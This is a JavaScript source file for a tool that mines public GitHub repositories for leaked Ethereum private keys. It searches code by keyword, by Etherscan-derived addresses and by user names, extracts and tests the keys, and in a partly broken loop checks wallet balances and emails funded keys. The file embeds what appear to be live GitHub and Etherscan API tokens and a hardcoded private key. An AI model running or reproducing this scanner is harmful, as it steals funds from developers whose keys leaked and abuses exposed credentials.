const {Octokit} = require("@octokit/rest")
const {parseForPrivateKeys} = require("./parseForPrivateKeys")
const ethers2 = require("ethers")
const {testPrivateKeys} = require("./testPrivateKeys")
const Web3 = require("web3")
const Promise = require("bluebird")
const { throttling } = require("@octokit/plugin-throttling");
const { retry } = require("@octokit/plugin-retry");
const names = require('./names.json')
const gitApiKey = "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"
//const gitApiKey = "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"
const etherscanApiKey = "KIP9EMNW2G9Y23TPCS21H6JGD6I9I2WW7T"
const etherscanAPI = require("etherscan-api").init(etherscanApiKey)
let MyOcto = Octokit.plugin(
  throttling,
  retry
)
 const octo = new MyOcto({
  auth: gitApiKey, 
  throttle: {
    onRateLimit: (retryAfter, options) => {
     // console.log("rate limited", options)
      if(options.request.retryCount < 5) {
        octo.log.info('retrying after ${retryAfter} seconds!')
        return true
      }
    },
    onSecondaryRateLimit: (retryAfter, options, octokit) => {
      // does not retry, only logs a warning
      octokit.log.warn(
        `Secondary quota detected for request ${options.method} ${options.url}`
      );
    },
  }
})

const startingAddresses = []
const getBlock = async () => {
  return await etherscanAPI.proxy.eth_blockNumber()
}

const searchForPrivKeysViaEtherscan = async (address, page) => {
       let transactions = await etherscanAPI.account.txlist('0x8d12A197cB00D4747a1fe03395095ce2A5CC6819', 1, 'latest', 1, 100, 'asc')
  let addresses = new Set(transactions.result.map(item => [item.from, item.to]).reduce((a,b)=> [...a,...b]))
  
  return Promise.map(addresses, async address => {
         let query = 'privateKey ${address}'
      setTimeout(() => {
          octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:100}).then(res => {
         let items = res.data.items
            console.log(address, items.length)
         return items.map(async item=> {
           try {
            const content = await octo.rest.git.getBlob({
              owner: item.repository.owner.login,
              repo: item.repository.name,
              file_sha: item.sha
            })
            //console.log(content)
            const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
            //console.log(codeFile)
            // console.log("keys")
            let keys = parseForPrivateKeys(codeFile)
            //console.log(keys)
          //  console.log("---------")
            testPrivateKeys(keys)
          }
          catch(err) {
            console.log(err)
          }
           
         })
            
      }).catch(err => err)
     
       }, 50)
    })
  }

const searchProfilesForPrivateKeys = async (page, name, per_page) => {
  let apiCalls = 0
  if(!name) {
    return
  }
  octo.rest.search.users({q:name, order:"asc", page, per_page}).then(res => {
    apiCalls += 1
    let profiles = res.data.items
   // console.log(profiles)
    let queryForProfile = "web3"
    let queries = profiles.map(profile =>{
      let query = {q: "User: " + profile.login + " " + queryForProfile}
      return query
    })
      
      //{q:"User:" + profile.login, queryProfileFor,  per_page:1, page}))
    //console.log(queries[0])
    Promise.each(queries, async query => {
      apiCalls += 1
     // console.log(query)
     let results = await octo.rest.search.code(query)
      let codeSnippets = results.data.items
      if(codeSnippets.length !== 0) {
         console.log("parsing 30 code files for private key", codeSnippets.length)
      Promise.each(codeSnippets, async snippet => {
        apiCalls += 1 
        //console.log("api calls ", apiCalls)//console.log(Object.keys(snippet))
        const content = await octo.rest.git.getBlob({
             owner: snippet.repository.owner.login,
             repo: snippet.repository.name,
             file_sha: snippet.sha
           })
           //console.log(content)
           const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
        //console.log(codeFile)
        let keys = parseForPrivateKeys(codeFile)
       // console.log(keys)
        testPrivateKeys(keys)
           searchProfilesForPrivateKeys(page+=1, name, per_page)
      })
    }
      else {
           searchProfilesForPrivateKeys(page+=1, name, per_page)
      }

    })
  }).catch(console.log)
}

  const searchForPrivKeysViaGithub = async (page) => {
    
    let query = 'priv CORE'
      setTimeout(() => {
          octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:30}).then(async res => {
         let items = res.data.items
           console.log(items.length)
            Promise.each(items , async item => {
                const content = await octo.rest.git.getBlob({
             owner: item.repository.owner.login,
             repo: item.repository.name,
             file_sha: item.sha
           })
              //console.log(content)
            const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
              //console.log(codeFile)
              let keys = parseForPrivateKeys(codeFile)
        // console.log(keys)
         //  console.log("---------")
           testPrivateKeys(keys)
              searchForPrivKeysViaGithub(page+=1)
        })
         
            
      }).catch(err => console.log(err))
         //searchForPrivKeysViaGithub(page+=1)
       }, 50)
    
  } 
  
  for(let i=0; i< 10; i++) {
    searchForPrivKeysViaGithub(i)
    
  }

//searchPrivKeysViaEtherscan()
// searchForPrivKeysViaEtherscan()



const ethContractAddress = "0x28c3b043BbccBc646211Af23F7Eaa5eE86F9C70d"

const testAddress = "0xd83eB40979cA0Dabe945E22629A72765dc9A39bD"
//testPrivateKeys(["9cf3e34444a91a01307eb7a50210aa8a3faacb8dcbfb3435d2acbca9765f4460"])


//searchForPrivKeysViaGithub(testAddress, page)



let network = "rinkeby"

const start = async () => {
   const provider = ethers2.getDefaultProvider()
while(true){
 
 // let initialWallet = ethers2.Wallet.
  let privateKey = initialWallet.privateKey
  //console.log(provider)
  //console.log(privateKey)
  //console.log(initialWallet.address)
  //console.log(provider)
  const balance = await provider.getBalance(initialWallet.address)
  if(balance > 0) {
    console.log(balance, privateKey)
    const {address}= wallet
    const {privateKey} = wallet
    sendEmail(balance, privateKey, address)
  }
}
}
//start()
//getBlock().then(console.log)
//console.log("got block number", block)
//ethAPI.account.txList().then(console.log)

//searchProfilesForPrivateKeys(1, 'Harry', 30)
// for(let i=0; i< names.length; i++) {
//   searchProfilesForPrivateKeys(1, names[i])
// }